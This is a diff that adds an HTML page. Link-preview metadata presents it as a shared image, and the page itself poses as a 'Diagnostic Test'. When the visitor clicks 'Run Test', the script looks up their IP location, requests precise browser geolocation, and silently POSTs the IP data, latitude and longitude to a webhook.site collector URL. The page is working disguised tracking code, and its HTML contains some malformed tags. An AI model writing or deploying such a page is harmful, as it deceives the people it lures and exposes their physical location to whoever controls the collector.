@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head<meta property="og:title" content="Shared Image">
+<meta property="og:image" content="https//static.thenounproject.com/png/1503613-200.png">
+<meta property="og:description" content="Click to view image">>
+    <title>Connectivity Test</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 50px; }
+        button { padding: 10px 20px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h2>Diagnostic Test</h2>
+    <button onclick="start()">Run Test</button>
+    <div id="out"></div>
+    <script>
+        async function start() {
+            const url = "https://webhook.site/2693a92a-d66e-4624-9c97-3d89ea325f67";
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            document.getElementById('out').innerText = "Testing " + data.city;
+            
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                await fetch(url, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({ip: data, lat: pos.coords.latitude, lon: pos.coords.longitude})
+                });
+                alert("Test Complete");
+            });
+        }
+    </script>
+</body>
+</html>
+
